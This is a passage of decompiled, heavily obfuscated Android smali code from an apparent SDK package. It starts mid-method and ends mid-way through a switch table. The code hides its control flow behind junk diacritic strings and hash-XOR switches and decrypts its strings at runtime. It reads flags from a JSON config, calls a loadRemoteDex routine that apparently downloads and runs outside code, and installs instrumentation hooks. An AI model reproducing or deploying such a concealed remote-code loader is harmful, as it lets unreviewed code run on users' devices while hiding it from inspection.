    sparse-switch v8, :sswitch_data_26

    goto :goto_2d

    :sswitch_87
    invoke-virtual {v3}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-ge v1, v0, :cond_12

    const-string v0, "\u06e8\u06d6\u06d6\u06e1\u06eb\u06eb\u06d9\u06e6\u06d8\u06d8\u06dc\u06dc\u06e4\u06d8\u06e5\u06d8\u06ec\u06e0\u06eb\u06e4\u06d9\u06d8\u06eb\u06e5\u06e7\u06e5\u06db\u06dc\u06d8\u06d8\u06d6\u06e8"

    goto :goto_2d

    :cond_12
    const-string v0, "\u06e2\u06da\u06e6\u06d6\u06e1\u06d8\u06d8\u06d9\u06eb\u06d9\u06d9\u06db\u06e5\u06df\u06d6\u06e2\u06d6\u06db\u06eb\u06d9\u06d7\u06d6\u06d8\u06e2\u06e1\u06d6\u06df\u06dc\u06da\u06e8\u06da\u06df\u06e2\u06e8\u06d8\u06e4\u06df\u06dc\u06dc\u06d9\u06e8\u06d8\u06e6\u06e1\u06d7\u06ec\u06e0\u06e1\u06d8\u06d9\u06e4\u06e4"

    goto :goto_2d

    :sswitch_88
    const-string v0, "\u06d9\u06e8\u06e4\u06e8\u06d8\u06e6\u06db\u06ec\u06e8\u06d8\u06e7\u06da\u06e8\u06e2\u06e0\u06dc\u06d8\u06e5\u06d7\u06db\u06d7\u06d6\u06e7\u06d8\u06d6\u06e7\u06d7\u06d8\u06db\u06e1\u06e8\u06e6\u06e6"

    goto :goto_2d

    :sswitch_89
    const-string v0, "\u06e8\u06d6\u06dc\u06d8\u06dc\u06e4\u06e6\u06e1\u06da\u06dc\u06d8\u06e2\u06d6\u06da\u06e0\u06db\u06dc\u06da\u06df\u06e7\u06e0\u06eb\u06eb\u06dc\u06e4\u06e7\u06dc\u06da\u06e4\u06e6\u06e5\u06e1\u06d8\u06e1\u06d8\u06d8\u06eb\u06dc\u06e5\u06df\u06df\u06da\u06d6\u06e6\u06e2"

    goto :goto_2a

    :sswitch_8a
    const-string v0, "\u06d9\u06e7\u06e8\u06d8\u06d6\u06da\u06d8\u06e0\u06db\u06e5\u06e7\u06da\u06e6\u06d8\u06e0\u06eb\u06db\u06d7\u06e0\u06d9\u06e1\u06e1\u06d8\u06ec\u06e8\u06e6\u06d8\u06e8\u06e5\u06dc\u06d9\u06e7\u06db\u06e5\u06e5\u06d8\u06d8\u06dc\u06d7\u06d6\u06d8"

    goto :goto_2a

    :sswitch_8b
    const v2, 0x17ab5cd4

    const-string v0, "\u06db\u06e2\u06e8\u06dc\u06e6\u06d8\u06db\u06d8\u06d7\u06e8\u06d8\u06ec\u06d7\u06e0\u06eb\u06eb\u06db\u06d9\u06e0\u06d7\u06e7\u06e0\u06d8\u06e7\u06d9\u06e8\u06e5\u06e6\u06d6\u06e5\u06d8\u06d6\u06e7\u06eb\u06e6\u06e6\u06db"

    :goto_2e
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v2

    sparse-switch v7, :sswitch_data_27

    goto :goto_2e

    :sswitch_8c
    const v7, 0x41845f09

    const-string v0, "\u06e7\u06e4\u06ec\u06e6\u06e8\u06e5\u06d8\u06e0\u06e2\u06db\u06e0\u06da\u06d9\u06dc\u06e6\u06e8\u06d8\u06e1\u06eb\u06e7\u06e6\u06e0\u06d7\u06db\u06eb\u06dc\u06d8\u06e6\u06da\u06dc\u06e0\u06e8\u06e6\u06e4\u06db\u06e8\u06e6\u06e6\u06ec\u06e2\u06eb\u06e1\u06d8\u06d8\u06e0\u06dc"

    :goto_2f
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_28

    goto :goto_2f

    :sswitch_8d
    const-string v0, "\u06eb\u06e2\u06d6\u06db\u06df\u06eb\u06ec\u06e2\u06dc\u06e0\u06e5\u06ec\u06e1\u06e1\u06dc\u06d8\u06e7\u06da\u06db\u06e8\u06e1\u06e1\u06d8\u06e5\u06e4\u06e2\u06e2\u06db\u06d8\u06d8\u06d8\u06e4\u06d9"

    goto :goto_2e

    :sswitch_8e
    const-string v0, "\u06e7\u06d7\u06d8\u06dc\u06ec\u06d8\u06d8\u06e4\u06d8\u06d6\u06d8\u06e1\u06d8\u06d9\u06d6\u06e8\u06e0\u06da\u06eb\u06eb\u06df\u06ec\u06e0\u06da\u06d7\u06e5\u06e0\u06d9\u06e8\u06d8\u06e6\u06e5\u06d8"

    goto :goto_2e

    :cond_13
    const-string v0, "\u06e5\u06e1\u06d6\u06e7\u06df\u06e6\u06d9\u06e0\u06e8\u06eb\u06e7\u06d8\u06df\u06d7\u06d6\u06df\u06e7\u06d8\u06e1\u06d9\u06d6\u06d6\u06e0\u06da\u06e8\u06e4\u06ec\u06e4\u06e5\u06d8\u06ec\u06e8\u06e1\u06d7\u06d7\u06d8\u06e2\u06d9\u06e1\u06d8\u06ec\u06e2\u06e8\u06df\u06d8\u06dc\u06d8\u06db\u06e7\u06db"

    goto :goto_2f

    :sswitch_8f
    invoke-virtual {v3, v1}, Lorg/json/JSONArray;->optString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_13

    const-string v0, "\u06e4\u06ec\u06d9\u06d8\u06e1\u06d7\u06e6\u06e1\u06d9\u06d9\u06d9\u06dc\u06e5\u06e4\u06e6\u06df\u06d7\u06d8\u06e8\u06e7\u06d9\u06e0\u06d9\u06dc\u06e0\u06e6\u06d8\u06d8\u06e7\u06d7\u06da\u06dc\u06d9\u06ec\u06e8\u06dc\u06d8\u06eb\u06d9\u06ec\u06d7\u06e0\u06d8\u06d9\u06e7\u06dc\u06d8\u06db\u06e5\u06d8"

    goto :goto_2f

    :sswitch_90
    const-string v0, "\u06d7\u06e0\u06d7\u06df\u06e6\u06d7\u06e2\u06eb\u06e6\u06df\u06da\u06e5\u06d9\u06dc\u06dc\u06e5\u06e0\u06da\u06db\u06db\u06e7\u06e1\u06e4\u06e5\u06e4\u06d7\u06eb\u06d8\u06d9"

    goto :goto_2f

    :sswitch_91
    const-string v0, "\u06db\u06e2\u06e6\u06d7\u06e2\u06e4\u06e1\u06e0\u06eb\u06e6\u06ec\u06e1\u06d8\u06d7\u06d9\u06e5\u06d8\u06d6\u06e1\u06ec\u06d9\u06e1\u06db\u06e4\u06da\u06e7\u06da\u06e5\u06d8\u06df\u06d7\u06e7\u06e8\u06e1\u06e2\u06da\u06e2\u06e5\u06dc\u06d8\u06e7\u06d8\u06e4\u06d6\u06e8"

    goto :goto_2e

    :sswitch_92
    new-instance v0, LCu7y/sdk/b5;

    const/4 v1, 0x2

    invoke-direct {v0, p0, v4, v1}, LCu7y/sdk/b5;-><init>(Landroid/content/Context;Landroid/app/Activity;I)V

    invoke-virtual {v4, v0}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto :goto_2b

    :sswitch_93
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto/16 :goto_29

    :sswitch_94
    const-string v0, "\u06df\u06d8\u06e1\u06d8\u06dc\u06df\u06e6\u06d8\u06d9\u06e2\u06df\u06df\u06e8\u06d9\u06e5\u06db\u06d6\u06d8\u06d6\u06eb\u06ec\u06d8\u06e1\u06e8\u06df\u06db\u06d9\u06e8\u06df\u06da\u06ec\u06e1\u06e5\u06d8\u06e7\u06d9\u06e0\u06db\u06e4\u06d8\u06d8"

    goto :goto_2c

    :sswitch_95
    const v3, 0x23df7e08

    const-string v0, "\u06e0\u06e8\u06d6\u06d8\u06e1\u06e7\u06e7\u06e0\u06e0\u06dc\u06ec\u06e8\u06e5\u06dc\u06d9\u06d7\u06e8\u06e5\u06e1\u06eb\u06da\u06d7\u06e0\u06e8\u06e2\u06d6\u06e5\u06d8\u06d7\u06d9\u06e7\u06ec\u06d7\u06e2\u06eb\u06d9\u06e7"

    :goto_30
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_29

    goto :goto_30

    :sswitch_96
    const-string v0, "\u06d9\u06d6\u06e4\u06df\u06d8\u06e1\u06d6\u06e5\u06e6\u06eb\u06d8\u06eb\u06d9\u06e2\u06d7\u06e5\u06d7\u06e6\u06d8\u06ec\u06e2\u06e8\u06da\u06e1\u06e8\u06d8\u06d8\u06e7\u06d7\u06eb\u06e0\u06e5\u06d8\u06da\u06e1\u06d6\u06e2\u06e5\u06dc"

    goto/16 :goto_2c

    :cond_14
    const-string v0, "\u06e5\u06e5\u06e6\u06d8\u06e8\u06db\u06e1\u06e7\u06ec\u06d6\u06d8\u06e5\u06dc\u06dc\u06df\u06e6\u06e4\u06e4\u06ec\u06d9\u06d8\u06ec\u06d8\u06d9\u06d7\u06df\u06d8\u06d8\u06eb\u06e5\u06e0\u06e5\u06dc\u06e6\u06d8\u06d9\u06e4\u06eb"

    goto :goto_30

    :sswitch_97
    invoke-static {v1}, Lapi/repository/Utils;->g(Landroid/app/Activity;)Z

    move-result v0

    if-eqz v0, :cond_14

    const-string v0, "\u06d7\u06d8\u06e7\u06e8\u06e4\u06da\u06db\u06e6\u06e1\u06d8\u06d6\u06da\u06e6\u06e0\u06e5\u06d7\u06e6\u06eb\u06df\u06e2\u06d9\u06d7\u06dc\u06e5\u06d8\u06d8\u06e7\u06df\u06d6\u06d8\u06d6\u06e0\u06d8\u06e8\u06da\u06e6\u06d8\u06da\u06e4\u06d6\u06d8\u06ec\u06e7\u06e7\u06df\u06db\u06e4\u06e2\u06e4\u06e8\u06eb\u06d9\u06e1\u06d8\u06ec\u06db\u06e5\u06d8\u06e7\u06e0\u06e1\u06d8"

    goto :goto_30

    :sswitch_98
    const-string v0, "\u06e7\u06e4\u06e0\u06e6\u06e1\u06e4\u06ec\u06e5\u06da\u06d8\u06d6\u06d8\u06e5\u06df\u06e5\u06d8\u06e2\u06d6\u06dc\u06d8\u06e7\u06e6\u06dc\u06d8\u06db\u06e1\u06eb\u06d9\u06e8\u06ec\u06db\u06eb\u06d6\u06d8\u06e0\u06e8\u06e6\u06e4\u06da\u06d7\u06e8\u06e7\u06d9\u06d7\u06e5\u06d6\u06d8\u06d7\u06eb\u06d7\u06e7\u06db\u06eb\u06ec\u06e5\u06e1\u06d8\u06d8\u06d8"

    goto :goto_30

    :sswitch_99
    new-instance v0, LCu7y/sdk/b5;

    const/4 v2, 0x3

    invoke-direct {v0, v1, p0, v2}, LCu7y/sdk/b5;-><init>(Landroid/app/Activity;Landroid/content/Context;I)V

    invoke-virtual {v1, v0}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    :goto_31
    invoke-static {p0}, Lapi/repository/Utils;->loadRemoteDex(Landroid/content/Context;)V

    const v1, 0x59969db0

    const-string v0, "\u06d8\u06ec\u06db\u06d7\u06da\u06d8\u06e7\u06e7\u06eb\u06e8\u06da\u06e8\u06d8\u06e7\u06e0\u06d8\u06e5\u06e1\u06dc\u06d8\u06e1\u06ec\u06e1\u06db\u06df\u06e4\u06dc\u06e5\u06e5\u06ec\u06d9\u06e1\u06e1\u06d8\u06ec\u06e7"

    :goto_32
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v2

    xor-int/2addr v2, v1

    sparse-switch v2, :sswitch_data_2a

    goto :goto_32

    :goto_33
    :sswitch_9a
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, LCu7y/sdk/a5;

    const/4 v2, 0x3

    invoke-direct {v1, v2}, LCu7y/sdk/a5;-><init>(I)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto/16 :goto_24

    :sswitch_9b
    const-string v0, "Hms/FrXwXDWjLAts8esjwtJpDCa44lyO2SZmAta4YO+gKT4=\n"

    const-string v1, "RYyDhVBdxGg=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v0, v1}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_31

    :sswitch_9c
    const-string v0, "\u06e0\u06dc\u06dc\u06e8\u06e7\u06d6\u06d7\u06e2\u06e8\u06d7\u06e2\u06dc\u06e2\u06db\u06d6\u06e1\u06eb\u06e0\u06dc\u06e2\u06e7\u06e4\u06dc\u06d8\u06e7\u06d8\u06df\u06d6\u06e2\u06e1\u06d7\u06dc\u06df\u06eb\u06eb\u06dc\u06d8\u06e1\u06d6\u06d6\u06d8\u06e5\u06eb\u06da"

    goto :goto_32

    :sswitch_9d
    const v2, 0x1469d51b

    const-string v0, "\u06e7\u06dc\u06dc\u06d8\u06ec\u06e6\u06e8\u06e2\u06e7\u06d6\u06db\u06ec\u06df\u06e4\u06e1\u06d8\u06e4\u06d9\u06d9\u06d9\u06d6\u06e6\u06d8\u06e2\u06e6\u06da\u06e1\u06dc\u06e8\u06e0\u06ec"

    :goto_34
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_2b

    goto :goto_34

    :sswitch_9e
    const-string v0, "LggSl35JSfAkDQ==\n"

    const-string v3, "S2Zz9RIsAZ8=\n"

    invoke-static {v0, v3}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v3, 0x1

    invoke-virtual {v5, v0, v3}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_15

    const-string v0, "\u06d7\u06eb\u06e4\u06e6\u06d8\u06e5\u06dc\u06e1\u06ec\u06e0\u06e7\u06eb\u06e5\u06dc\u06d9\u06e0\u06eb\u06eb\u06e8\u06e8\u06e7\u06d8\u06e4\u06db\u06d6\u06df\u06d9\u06e5\u06d9\u06e6\u06e8\u06d8\u06e0\u06d9\u06e7\u06e1\u06e0\u06e8\u06db\u06e7\u06e2\u06d8\u06eb\u06e8\u06e8\u06d9\u06e4\u06d6\u06e1\u06e1\u06e4\u06d6\u06db\u06ec\u06e6\u06dc\u06d8"

    goto :goto_34

    :cond_15
    const-string v0, "\u06db\u06da\u06dc\u06e6\u06e8\u06e4\u06e4\u06e2\u06dc\u06e8\u06e8\u06e0\u06df\u06df\u06e8\u06e8\u06d6\u06e7\u06e8\u06e4\u06e2\u06e0\u06e8\u06ec\u06e7\u06e1\u06d8\u06da\u06e4\u06e8\u06e6\u06d8\u06d8\u06ec\u06d6\u06d7\u06e0\u06e2\u06e6\u06da\u06e5\u06da"

    goto :goto_34

    :sswitch_9f
    const-string v0, "\u06e6\u06d9\u06ec\u06d8\u06d7\u06db\u06d8\u06eb\u06e2\u06d7\u06d7\u06e1\u06e2\u06eb\u06dc\u06d8\u06da\u06d6\u06d6\u06d8\u06da\u06e2\u06d6\u06d8\u06d9\u06e1\u06e7\u06d6\u06d6\u06d8\u06e6\u06e7\u06eb"

    goto :goto_34

    :sswitch_a0
    const-string v0, "\u06e7\u06e0\u06e1\u06d8\u06e4\u06eb\u06e4\u06d7\u06e6\u06e5\u06d8\u06d7\u06eb\u06e6\u06e2\u06d6\u06dc\u06d8\u06db\u06dc\u06e7\u06eb\u06e1\u06e4\u06d9\u06e4\u06d6\u06d8\u06da\u06e8\u06e4\u06e1\u06d8\u06d8\u06d8\u06d7\u06da\u06d6\u06d8\u06e4\u06e0\u06e7\u06d8\u06d7\u06d8\u06dc\u06dc\u06d8"

    goto :goto_32

    :sswitch_a1
    const-string v0, "\u06d7\u06e5\u06d6\u06d8\u06dc\u06e4\u06e8\u06e6\u06d9\u06e5\u06d8\u06e1\u06eb\u06dc\u06eb\u06db\u06e8\u06d7\u06e6\u06e8\u06d8\u06e2\u06eb\u06db\u06da\u06e1\u06d7\u06da\u06ec\u06da\u06e6\u06e6\u06d8\u06d6\u06da\u06dc\u06d8\u06d7\u06d7\u06e7\u06e6\u06da\u06e4\u06d6\u06d6\u06d8\u06d8\u06e4\u06e5\u06d7\u06e1\u06e8\u06e1\u06dc\u06ec\u06e7\u06e6\u06d8"

    goto :goto_32

    :sswitch_a2
    const-string v0, "axPDIPbj56dsAs0=\n"

    const-string v1, "BXa0QZWXjtE=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v1

    const v2, 0x4efcfd89

    const-string v0, "\u06e2\u06e6\u06db\u06e0\u06e5\u06d8\u06d9\u06d8\u06eb\u06e2\u06e1\u06e8\u06ec\u06d9\u06df\u06e6\u06e7\u06db\u06e1\u06e4\u06e5\u06da\u06e2\u06eb\u06d7\u06ec\u06e0\u06e0\u06d8\u06e4\u06e7\u06db\u06e5\u06e0\u06d8\u06dc\u06d8\u06eb\u06e7\u06d6\u06dc\u06d8\u06d9\u06e4\u06e8\u06d8\u06e2\u06e5\u06df"

    :goto_35
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_2c

    goto :goto_35

    :sswitch_a3
    const v3, 0x4362d04e

    const-string v0, "\u06dc\u06dc\u06eb\u06e0\u06e4\u06d7\u06e8\u06d8\u06dc\u06e1\u06e2\u06dc\u06db\u06da\u06d8\u06d8\u06d6\u06e4\u06db\u06e1\u06db\u06e7\u06eb\u06d8\u06e2\u06d6\u06e7\u06e6\u06e8\u06da\u06d6\u06d9\u06d7\u06ec\u06df\u06e5\u06da\u06d7\u06e1\u06ec\u06e2\u06db"

    :goto_36
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_2d

    goto :goto_36

    :sswitch_a4
    if-eqz v1, :cond_16

    const-string v0, "\u06ec\u06eb\u06e4\u06e8\u06e5\u06d8\u06d8\u06eb\u06da\u06dc\u06d8\u06e1\u06e4\u06dc\u06eb\u06da\u06d8\u06ec\u06db\u06e8\u06d8\u06d8\u06da\u06ec\u06e7\u06e1\u06d7\u06da\u06e6\u06e6\u06dc\u06ec\u06d9\u06e4\u06da\u06db\u06d7\u06df\u06e2\u06e5\u06ec\u06e8\u06eb\u06e4\u06e6\u06e6\u06d8\u06da\u06da\u06df\u06df\u06db\u06d8\u06d8\u06dc\u06e8\u06dc\u06d8"

    goto :goto_36

    :sswitch_a5
    const-string v0, "\u06da\u06e0\u06e6\u06d8\u06e2\u06e6\u06eb\u06e7\u06e4\u06e5\u06e4\u06df\u06d8\u06d8\u06db\u06e7\u06e6\u06e8\u06d8\u06d7\u06d9\u06e6\u06e0\u06eb\u06db\u06e0\u06d8\u06e8\u06d6\u06d6\u06d6\u06d8\u06d8"

    goto :goto_35

    :cond_16
    const-string v0, "\u06e7\u06da\u06d8\u06d8\u06e8\u06dc\u06e5\u06d8\u06dc\u06df\u06df\u06e1\u06d7\u06ec\u06e0\u06d8\u06e1\u06d8\u06dc\u06d6\u06d9\u06e4\u06e0\u06e5\u06d8\u06e7\u06e1\u06e8\u06d6\u06dc\u06e2\u06ec\u06d7\u06d7\u06d6\u06ec\u06e2\u06e0\u06e1\u06e0"

    goto :goto_36

    :sswitch_a6
    const-string v0, "\u06ec\u06e5\u06e5\u06ec\u06e8\u06ec\u06db\u06d7\u06e4\u06e2\u06d7\u06e2\u06da\u06e1\u06da\u06ec\u06e2\u06df\u06db\u06e5\u06d8\u06e8\u06ec\u06dc\u06d8\u06d6\u06e0\u06d8\u06d8\u06e1\u06ec\u06e1\u06d8\u06e8\u06d9\u06d8\u06d8\u06dc\u06e4"

    goto :goto_36

    :sswitch_a7
    const-string v0, "\u06d8\u06da\u06d8\u06d8\u06e5\u06e0\u06d8\u06e8\u06e2\u06d6\u06d6\u06db\u06e1\u06df\u06e2\u06e8\u06d8\u06dc\u06e5\u06e0\u06e8\u06e1\u06eb\u06eb\u06d8\u06db\u06e4\u06e8\u06dc\u06dc\u06ec\u06d8\u06eb\u06e5\u06d8\u06df\u06d6\u06e7\u06d8\u06eb\u06da\u06e8\u06dc\u06d6\u06e2\u06e7\u06eb\u06db\u06e1\u06e6\u06d6"
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_1

    goto :goto_35

    :sswitch_a8
    const-string v0, "\u06da\u06e0\u06dc\u06d8\u06d9\u06e1\u06dc\u06ec\u06e4\u06d6\u06d8\u06d8\u06da\u06d7\u06d9\u06dc\u06db\u06e2\u06d6\u06d7\u06dc\u06eb\u06e5\u06e6\u06e7\u06ec\u06e6\u06ec\u06e2\u06db\u06da\u06da\u06df\u06db\u06d8\u06d8\u06df\u06d7\u06e1\u06d8\u06e1\u06e4\u06e7\u06e4\u06df\u06e4\u06df\u06dc\u06e5\u06e8\u06d9\u06e2\u06d7\u06e1\u06e6\u06d8\u06d8\u06e0\u06df"

    goto :goto_35

    :sswitch_a9
    const v2, 0x106ae0

    :try_start_12
    const-string v0, "\u06e6\u06e2\u06d8\u06df\u06ec\u06e5\u06da\u06d7\u06e1\u06d8\u06e1\u06d7\u06e0\u06d9\u06e1\u06eb\u06d7\u06df\u06e6\u06d8\u06e1\u06ec\u06e4\u06e7\u06ec\u06d9\u06d9\u06e5\u06d9\u06d9\u06e7\u06dc\u06d8"

    :goto_37
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_2e

    goto :goto_37

    :sswitch_aa
    invoke-static {p0}, Lapi/repository/HookManager;->hookInstrumentation(Landroid/content/Context;)V

    goto/16 :goto_33

    :sswitch_ab
    const-string v0, "\u06db\u06ec\u06e6\u06d8\u06e6\u06ec\u06dc\u06d8\u06df\u06da\u06e8\u06d8\u06e0\u06dc\u06e8\u06db\u06df\u06df\u06dc\u06eb\u06d6\u06d8\u06d9\u06ec\u06e0\u06da\u06e6\u06da\u06df\u06da\u06eb\u06d7\u06e2\u06e2\u06e8\u06e0\u06ec\u06e6\u06da\u06e1\u06e5\u06e2\u06e0\u06d7\u06e2\u06d7\u06e5\u06e0\u06e4\u06e6\u06e4\u06da\u06e0\u06da\u06d8\u06d8\u06e1\u06e8\u06d8"

    goto :goto_37

    :sswitch_ac
    const v3, -0x29076bae

    const-string v0, "\u06dc\u06d9\u06da\u06eb\u06eb\u06e1\u06da\u06d9\u06e6\u06e2\u06df\u06d9\u06e6\u06e5\u06e4\u06e4\u06e1\u06d8\u06d6\u06d9\u06e7\u06e0\u06e8\u06d6\u06e8\u06da\u06e5\u06e1\u06db\u06db\u06d8\u06d6\u06db\u06eb\u06dc\u06d8\u06d9\u06db\u06e8\u06d8\u06df\u06d7\u06df\u06d8\u06e7\u06e5\u06d8\u06d6\u06da\u06e5"

    :goto_38
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_2f

    goto :goto_38

    :sswitch_ad
    const-string v0, "\u06e6\u06d9\u06d7\u06e1\u06e2\u06e5\u06d8\u06df\u06e5\u06e8\u06d7\u06df\u06e1\u06d8\u06e5\u06d7\u06e1\u06d8\u06d8\u06db\u06eb\u06d8\u06e6\u06e5\u06eb\u06e1\u06e2\u06e2\u06d7\u06d6\u06dc\u06e1\u06d7\u06e5\u06eb\u06e6\u06e8\u06d9\u06d6\u06e8\u06d9\u06dc\u06e7\u06e5\u06e2"

    goto :goto_37

    :cond_17
    const-string v0, "\u06ec\u06db\u06e2\u06db\u06e6\u06d7\u06e4\u06d9\u06e5\u06d8\u06e1\u06d6\u06e1\u06d8\u06e6\u06db\u06e1\u06e1\u06df\u06dc\u06d8\u06e4\u06dc\u06ec\u06df\u06e7\u06e4\u06d7\u06eb\u06dc\u06d8\u06d9\u06e0\u06e7\u06e5\u06e0\u06d8\u06d7\u06e6\u06e4\u06e5\u06e8\u06d6\u06d8\u06e5\u06e1\u06d9\u06e5\u06d9\u06dc\u06df\u06e1\u06e1\u06d8"

    goto :goto_38

    :sswitch_ae
    invoke-virtual {v1}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-lez v0, :cond_17

    const-string v0, "\u06db\u06e0\u06e2\u06d9\u06e8\u06e4\u06df\u06e8\u06ec\u06ec\u06e8\u06d8\u06e8\u06e2\u06dc\u06d7\u06e1\u06d8\u06d8\u06df\u06da\u06d8\u06d8\u06ec\u06ec\u06d6\u06d8\u06e8\u06e4\u06d7\u06e0\u06e1\u06e8\u06e5\u06eb\u06e0\u06d8\u06e4\u06df\u06eb\u06e4\u06ec\u06e8\u06eb\u06e7\u06e1\u06d8\u06e6\u06d8\u06e4\u06e0\u06df"

    goto :goto_38

    :sswitch_af
    const-string v0, "\u06da\u06df\u06e2\u06d8\u06d9\u06d8\u06da\u06e6\u06ec\u06dc\u06e0\u06e7\u06db\u06e7\u06e5\u06d8\u06e4\u06e4\u06e5\u06d8\u06d7\u06db\u06ec\u06df\u06d6\u06e7\u06e7\u06da\u06d7\u06ec\u06e0\u06d8\u06dc\u06e5\u06d6\u06d8\u06e8\u06da\u06df\u06db\u06db\u06db\u06e6\u06e4\u06e4\u06e0\u06e6\u06d8\u06d8\u06eb\u06d9\u06e5"

    goto :goto_38

    :sswitch_b0
    const-string v0, "\u06ec\u06d7\u06e0\u06e0\u06eb\u06ec\u06e5\u06e0\u06e4\u06d8\u06e7\u06d8\u06d7\u06d9\u06d8\u06da\u06e5\u06d8\u06e8\u06e8\u06e8\u06d8\u06eb\u06e5\u06d6\u06d8\u06e5\u06dc\u06d6\u06db\u06da\u06dc\u06d8"

    goto :goto_37

    :sswitch_b1
    invoke-static {p0}, Lapi/repository/HookManager;->initHooks(Landroid/content/Context;)V

    goto/16 :goto_33

    :sswitch_b2
    const-string v0, "bdjNqq5+sovQqNHe90DPe64Tl6XnNYZ30of80ftQzUKe2M2qrn6yM7yfmYT2\n"

    const-string v1, "Nj9xOUvTKtY=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "xXc=\n"

    const-string v2, "qhzc5ijUAUo=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_1

    goto/16 :goto_24

    nop

    :sswitch_data_0
    .sparse-switch
        -0x70e6e6e3 -> :sswitch_3
        -0x5a8b8b02 -> :sswitch_0
        -0x41ca14e6 -> :sswitch_7
        0x6bbac789 -> :sswitch_b2
    .end sparse-switch

    :sswitch_data_1
    .sparse-switch
        0x5d26058 -> :sswitch_1
        0x16e60293 -> :sswitch_b2
        0x359c17c0 -> :sswitch_9
        0x714efcc5 -> :sswitch_d
    .end sparse-switch

    :sswitch_data_2
    .sparse-switch
        -0x5ccfe205 -> :sswitch_4
        -0x192456d9 -> :sswitch_6
        0x5e719db -> :sswitch_5
        0xcf85678 -> :sswitch_2
    .end sparse-switch

    :sswitch_data_3
    .sparse-switch
        -0x31533d18 -> :sswitch_c
        0x14792cb1 -> :sswitch_b
        0x292b0da9 -> :sswitch_a
        0x6f6eaa28 -> :sswitch_8
    .end sparse-switch

    :sswitch_data_4
    .sparse-switch
        -0x65bb551b -> :sswitch_10
        -0x5e6f3ab2 -> :sswitch_14
        -0x4af863d6 -> :sswitch_b2
        -0x1b0f0933 -> :sswitch_e
    .end sparse-switch

    :sswitch_data_5
    .sparse-switch
        -0x76c7122d -> :sswitch_f
        -0x19112f3c -> :sswitch_11
        -0x17189071 -> :sswitch_13
        0x2a9ed19b -> :sswitch_12
    .end sparse-switch

    :sswitch_data_6
    .sparse-switch
        -0x21308884 -> :sswitch_15
        -0xbca46fc -> :sswitch_1b
        0x13a2fea1 -> :sswitch_2a
        0x3947ee7b -> :sswitch_1a
    .end sparse-switch

    :sswitch_data_7
    .sparse-switch
        0x551ec15 -> :sswitch_17
        0x12b49bae -> :sswitch_18
        0x2a650d07 -> :sswitch_16
        0x3293357e -> :sswitch_19
    .end sparse-switch

    :sswitch_data_8
    .sparse-switch
        -0x399da7d8 -> :sswitch_2a
        0x2353dbda -> :sswitch_22
        0x676f25be -> :sswitch_1c
        0x7c7eef94 -> :sswitch_1e
    .end sparse-switch

    :sswitch_data_9
    .sparse-switch
        -0x6a559ecc -> :sswitch_1f
        0x121e57a4 -> :sswitch_20
        0x37c164f4 -> :sswitch_21
        0x5fc832b4 -> :sswitch_1d
    .end sparse-switch

    :sswitch_data_a
    .sparse-switch
        -0x1f589f31 -> :sswitch_29
        0x1c6ac8e2 -> :sswitch_23
        0x1ca2c619 -> :sswitch_25
        0x54c9a3ba -> :sswitch_2a
    .end sparse-switch

    :sswitch_data_b
    .sparse-switch
        -0x7e31e5c7 -> :sswitch_27
        -0x483060dc -> :sswitch_24
        -0xbada377 -> :sswitch_26
        -0x7696f21 -> :sswitch_28
    .end sparse-switch

    :sswitch_data_c
    .sparse-switch
        -0x16979070 -> :sswitch_2e
        -0x131e682c -> :sswitch_32
        0x1c7fea93 -> :sswitch_33
